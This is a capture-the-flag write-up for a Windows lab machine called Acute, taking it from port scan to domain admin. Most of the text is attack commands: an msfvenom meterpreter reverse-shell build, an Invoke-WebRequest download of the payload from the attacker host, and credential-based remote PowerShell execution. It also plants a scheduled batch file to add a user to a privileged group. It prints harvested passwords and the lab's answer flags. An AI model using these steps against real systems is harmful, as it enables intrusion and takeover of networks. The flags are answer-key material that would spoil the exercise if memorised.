# Acute Machine

# Table of Contents

- [Research](#research)
- [Reproduce](#reproduce)
- [Flag](#flag)

# Research

    nmap -p- --min-rate 10000 -p- -v 10.129.136.40
    ...
    Not shown: 65534 filtered tcp ports (no-response)
    PORT    STATE SERVICE
    443/tcp open  https

Port scanning HTTPS

    nmap -sC -sV -p 443 10.129.136.40

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 12:02 BST
    Nmap scan report for 10.129.136.40
    Host is up (0.068s latency).

    PORT    STATE SERVICE  VERSION
    443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_ssl-date: 2022-07-16T11:02:24+00:00; 0s from scanner time.
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    | ssl-cert: Subject: commonName=atsserver.acute.local
    | Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
    | Not valid before: 2022-01-06T06:34:58
    |_Not valid after:  2030-01-04T06:34:58
    | tls-alpn: 
    |_  http/1.1
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/s
    Nmap done: 1 IP address (1 host up) scanned in 17.38 seconds

Editing `/etc/hosts`

    10.129.136.40   atsserver.acute.local
    10.129.136.40   atsserver


Visiting https://atsserver.acute.local

<img width="1440" alt="image" src="https://user-images.githubusercontent.com/10171446/179352430-496305a4-ed6c-47bc-a692-ad11587dbd95.png">

Looking on the `about.html` page

<img width="923" alt="image" src="https://user-images.githubusercontent.com/10171446/179352461-6e2f96f5-34bd-445b-ab95-bfafc93c50ee.png">

Now we can generate a username list

    Awallace
    Chall
    Edavies
    Imonks
    Jmorgan
    Lhopkins

Also, `https://atsserver.acute.local/New_Starter_CheckList_v7.docx` contains useful information and a password

<img width="757" alt="image" src="https://user-images.githubusercontent.com/10171446/179352606-7e1e860e-74ba-4d9e-a95b-b5c94911a751.png">

<img width="795" alt="image" src="https://user-images.githubusercontent.com/10171446/179352634-7eb094dc-a45f-4d94-a530-42e4945899ea.png">

Using `exiftool` against New_Starter_CheckList_v7.docx reveals the hostname of the machine it was created on as `Acute-PC01`.

Address: https://atsserver.acute.local/Acute_Staff_Access
Username: `edavies`
Default Password: `Password1!`
Computer name: `Acute-PC01`

Now we have a powershell window!

Time for a reverse shell

    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.129.136.40 LPORT=4000 -f exe > shell.exe
    
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 200774 bytes
    Final size of exe file: 207360 bytes


Kali:

    msfconsole
    use exploit/muilti/handler
    set LHOST=10.10.14.52
    set LPORT=4000
    
    
Powershell:
    Invoke-WebRequest "http://10.10.14.52:8000/shell.exe" -OutFile "shell.exe"


Skipped over some messy work

Powershell:

    $passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $passwd)
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {whoami} -credential $cred

 Now we can execute commands has `imonks`
 
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /users} -credential $cred

and

    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /users/imonks/desktop} -credential $cred

<img width="884" alt="image" src="https://user-images.githubusercontent.com/10171446/179353503-3195b24f-1e19-4e17-a419-b39d134b47dc.png">

We have `user.txt`

    PS C:\Utils> 
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {cat /users/imonks/desktop/user.txt} -credential $cred
    
    31504774ed650cfab3b00d0078524019


    PS C:\Utils> 
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {cat /users/imonks/desktop/wm.ps1} -credential $cred

    $securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003  660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'

    $passwd = $securepasswd | ConvertTo-SecureString
    $creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
    Invoke-Command -ScriptBlock {cmd.exe /c c:\utils\rev.exe} -ComputerName Acute-PC01 -Credential $creds




Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\rev.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred


<img width="877" alt="image" src="https://user-images.githubusercontent.com/10171446/179353825-2cc7e140-84f7-4490-b570-783ea2bbe59d.png">

`jmorgan` is part of the administrator group. Now we can dump hashes using Meterpreter.

This reveals the `administrator` password to be `Password@123`. However, the `administator` does not respond to a login.

But we found new users at `ATSSERVER`:

    $passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ("acute\awallace", $passwd)
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {whoami} -credential $cred

Now prying we find `keepmeon.bat`:

    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /"program files"/keepmeon} -credential $cred
    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {cat /"program files"/keepmeon/keepmeon.bat} -credential $cred



<img width="877" alt="image" src="https://user-images.githubusercontent.com/10171446/179353956-0622cec8-1456-418f-a3e0-f9538e90eebd.png">

Now this `keepmeon.bat` file runs as a Cron job every 5 minute, which we can use to creat a payload.

So, let's add `awallace` to the group of `site_admin` and wait 5 minutes

    Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}

We can confirm the user `awallace` is part of the `site_admin` group by:

    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {net group site_admin} -credential $cred

<img width="884" alt="image" src="https://user-images.githubusercontent.com/10171446/179354082-6065e733-941f-4fcc-836f-67c2ff8f7463.png">

    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {ls /users/administrator/desktop} -credential $cred
    ...

Now we are part of the `site_admin` group we can get `root.txt` flag.


    invoke-Command -computername atsserver -ConfigurationName dc_manage  -ScriptBlock {cat /users/administrator/desktop/root.txt} -credential $cred

<img width="882" alt="image" src="https://user-images.githubusercontent.com/10171446/179354238-3e94f597-21f4-4000-8530-58fe93018089.png">

b30bb6ee56995e0d6f5d39d6f9f81d8a


# Reproduce

See research


# Flag

b30bb6ee56995e0d6f5d39d6f9f81d8a

